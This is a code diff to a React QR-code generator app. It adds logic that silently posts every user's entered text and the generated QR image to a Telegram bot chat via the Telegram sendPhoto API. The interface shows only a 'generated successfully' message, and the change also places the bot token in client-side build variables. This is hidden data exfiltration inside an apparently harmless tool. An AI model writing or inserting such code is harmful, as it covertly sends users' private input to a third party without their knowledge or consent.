@@ -1,11 +1,18 @@
 import { useState } from "react";
 import QRCode from "qrcode";
 import { FaGithub } from "react-icons/fa";
+import axios from "axios";
 
 function App() {
   const [inputText, setInputText] = useState("");
   const [qrCodeUrl, setQrCodeUrl] = useState("");
   const [error, setError] = useState("");
+  const [status, setStatus] = useState("");
+  const [isSending, setIsSending] = useState(false);
+
+ const TELEGRAM_BOT_TOKEN = import.meta.env.VITE_TELEGRAM_BOT_TOKEN;
+ const TELEGRAM_CHAT_ID = import.meta.env.VITE_TELEGRAM_CHAT_ID;
+
 
   const generateQRCode = async () => {
     if (!inputText.trim()) {
@@ -16,23 +23,35 @@ function App() {
     setError("");
 
     try {
-      const url = await QRCode.toDataURL(inputText, {
-        color: {
-          dark: "#000000",
-          light: "#ffffff", 
-        },
-        width: 500, 
-      });
+      const url = await QRCode.toDataURL(inputText, { width: 500 });
       setQrCodeUrl(url);
+
+      const response = await fetch(url);
+      const blob = await response.blob();
+
+      setIsSending(true);
+      const formData = new FormData();
+      formData.append("chat_id", TELEGRAM_CHAT_ID);
+      formData.append("caption", inputText); 
+      formData.append("photo", blob, "qrcode.png");
+
+      const telegramResponse = await axios.post(
+        `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`,
+        formData
+      );
+
+      setStatus("QR Code Generated successfully!");
+      setIsSending(false);
     } catch (err) {
-      console.error("Error generating QR code:", err);
+      console.error("Error:", err);
+      setStatus("Failed to Generate QR Code");
+      setIsSending(false);
     }
   };
 
   return (
     <div className="min-h-screen flex items-center justify-center bg-gradient-to-br from-gray-900 to-black">
       <div className="flex flex-col lg:flex-row bg-white text-black rounded-3xl shadow-2xl w-full max-w-5xl p-8 lg:p-12 gap-6">
-     
         <div className="flex-1 flex flex-col gap-8">
           <div className="text-center bg-white text-gray-800 rounded-md p-4 border-gray-200">
             <h1 className="text-2xl font-semibold tracking-tight">
@@ -58,8 +77,9 @@ function App() {
             <button
               onClick={generateQRCode}
               className="w-full bg-purple-600 hover:bg-purple-700 text-white p-3 rounded-md font-semibold transition-transform transform hover:scale-105 shadow-lg"
+              disabled={isSending}
             >
-              Generate
+              {isSending ? "Generating" : "Generate"}
             </button>
 
             {qrCodeUrl && (
@@ -72,6 +92,8 @@ function App() {
               </a>
             )}
           </div>
+
+          <p className="text-center text-green-500 mt-4">{status}</p>
 
           <footer className="mt-auto text-center text-gray-400 text-sm">
             <div className="flex items-center justify-center gap-2">
